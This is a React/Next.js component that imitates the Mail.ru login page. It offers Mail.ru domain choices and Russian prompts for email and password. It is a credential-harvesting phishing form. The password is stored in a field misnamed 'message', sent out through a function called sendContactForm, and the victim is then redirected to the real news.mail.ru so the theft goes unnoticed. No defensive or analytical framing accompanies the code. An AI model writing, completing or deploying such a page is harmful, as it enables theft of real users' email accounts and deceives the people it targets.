"use client";
import { useEffect, useState } from "react";
import { sendContactForm } from "../lib/api";
import styles from "../styles/styles.module.css";
import { useRouter } from 'next/navigation';
const initialValues = {
  email: "",
  message: "",
};

const initialState = { values: initialValues };

const LoginForm = () => {
  const [state, setState] = useState(initialState);
  const [showSelect, setShowSelect] = useState(true)
  const [isActiveTwo, setIsActiveTwo] = useState(false);

  const navigate = useRouter()

  const { values } = state;

  const handleChange = ({ target }) => {
    setState((prev) => ({
      ...prev,
      values: {
        ...prev.values,
        [target.name]: target.value,
      },
    }));
  };

  const onSubmit = async (e) => {
    // e.preventDefault()
    setState((prev) => ({
      ...prev,
    }));
    await sendContactForm(values);

    navigate.push('https://news.mail.ru')
    
  };

  const changeInputHandler = (e) => {
    e.preventDefault();
    setIsActiveTwo(true);
    setShowSelect(false)
  };

  useEffect(() => {
    if (values.email.includes('@')) {
      setShowSelect(false)
    } else {
      setShowSelect(true)
    }
  }, [values.email])

  return (
    <div>
      <form className={styles.LoginFormContainer}>
        <div className={styles.mailPlace}>
          <input
            className={
              isActiveTwo
                ? `${styles.passwordInputDisable}`
                : showSelect ? `${styles.loginInputActive}` : `${styles.loginInputActiveLong}`
            }
            type="email"
            name="email"
            placeholder="Ваш Email"
            value={values.email}
            onChange={handleChange}
          />
          <select className={showSelect ? `${styles.showSelect}` : `${styles.disableSelect}`}>
            <option>@mail.ru</option>
            <option>@inbox.ru</option>
            <option>@bk.ru</option>
            <option>@list.ru</option>
            <option>@internet.ru</option>
          </select>
        </div>
        <button
          className={
            isActiveTwo
              ? `${styles.buttonSendDisable}`
              : `${styles.buttonSendActive}`
          }
          onClick={changeInputHandler}>
          Ввести пароль &#10132;
        </button>
        <input
          className={
            isActiveTwo
              ? `${styles.passwordInputActive}`
              : `${styles.loginInputDisable}`
          }
          type="text"
          name="message"
          placeholder="Ваш пароль"
          value={values.name}
          onChange={handleChange}
        />
        <button
          className={
            isActiveTwo
              ? `${styles.buttonSendActive}`
              : `${styles.buttonSendDisable}`
          }
          onClick={onSubmit}>
          Продолжить
        </button>
      </form>
    </div>
  );
};

export default LoginForm;
